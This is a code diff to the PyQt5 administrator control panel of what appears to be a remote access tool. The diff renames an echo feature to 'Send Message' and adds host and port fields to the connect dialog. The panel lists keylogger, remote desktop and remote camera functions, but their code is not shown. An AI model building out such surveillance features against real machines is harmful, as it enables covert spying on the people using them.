@@ -4,11 +4,11 @@ import struct
 from typing import Type
 
 from PyQt5.QtCore import QThread, pyqtSignal
+from PyQt5.QtGui import QIntValidator
 from PyQt5.QtWidgets import QLabel, QWidget, QPushButton, QDialog, QVBoxLayout, QLineEdit, QHBoxLayout
 
 from RATConnection import RATClient
-from RATFunction.RATFunction import RATFunction
-from RATFunction.EchoUI import EchoUI
+from RATFunction.MessageUI import MessageUI
 from RATFunction.RATFunction import Side
 from RATFunction.RATFunctionRegistry import RATFunctionRegistry
 from RATFunction.RATFunctionUI import RATFunctionUI
@@ -52,7 +52,7 @@ class AdministratorControlPanel(QWidget):
         for function_class in function_classes:
             self.registry.add_function(function_class(Side.ADMIN_SIDE, self.client.packet_queue))
 
-        self.add_control_panel_function('Echo', 1, EchoUI)
+        self.add_control_panel_function('Send Message', 1, MessageUI)
         self.add_control_panel_function('Remote Desktop', 2, RemoteDesktopUI)
         self.add_control_panel_function('Keylogger', 3, MyLoggingUI)
         self.add_control_panel_function('Remote Camera', 4, RemoteCameraUI)
@@ -64,6 +64,7 @@ class AdministratorControlPanel(QWidget):
         self.setGeometry(100, 100, 400, 150)
         self.layout = QVBoxLayout()
         self.setLayout(self.layout)
+        self.move(700, 400)
 
     def add_button(self, button):
         self.layout.addWidget(button)
@@ -79,12 +80,23 @@ class AdministratorControlPanel(QWidget):
         dialog = QDialog(self)
         dialog.setWindowTitle('Connect')
 
-        # Create a label and text input field in the dialog
+        host_label = QLabel('Host:', dialog)
+        host_input_field = QLineEdit(dialog)
+
+        port_label = QLabel('Port:', dialog)
+        port_input_field = QLineEdit(dialog)
+        port_input_field.setText('8888')
+        port_input_field.setValidator(QIntValidator())
+
         label = QLabel('Enter password:', dialog)
         input_field = QLineEdit(dialog)
 
         # Layout the label and text input field in the dialog
         layout = QVBoxLayout()
+        layout.addWidget(host_label)
+        layout.addWidget(host_input_field)
+        layout.addWidget(port_label)
+        layout.addWidget(port_input_field)
         layout.addWidget(label)
         layout.addWidget(input_field)
         dialog.setLayout(layout)
@@ -97,13 +109,21 @@ class AdministratorControlPanel(QWidget):
         layout.addWidget(ok_button)
         layout.addWidget(cancel_button)
 
+        dialog.move(800, 400)
+        dialog.setMinimumWidth(250)
+
         # Display the dialog and wait for user input
         if dialog.exec_() == QDialog.Accepted:
             # User clicked OK, get the user input and continue
             self.password = input_field.text()
             self.client.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.client.connected_callback = self.send_password
-            self.setup_network_thread("localhost", 8888)
+
+            host = host_input_field.text()
+            if len(host) == 0:
+                host = 'localhost'
+            port = int(port_input_field.text())
+            self.setup_network_thread(host, port)
         else:
             exit()
 
@@ -121,5 +141,3 @@ class AdministratorControlPanel(QWidget):
         new_button.clicked.connect(new_ui.show)
         self.add_button(new_button)
         self.control_panel_elements[function_id] = (new_button, new_ui)
-
-
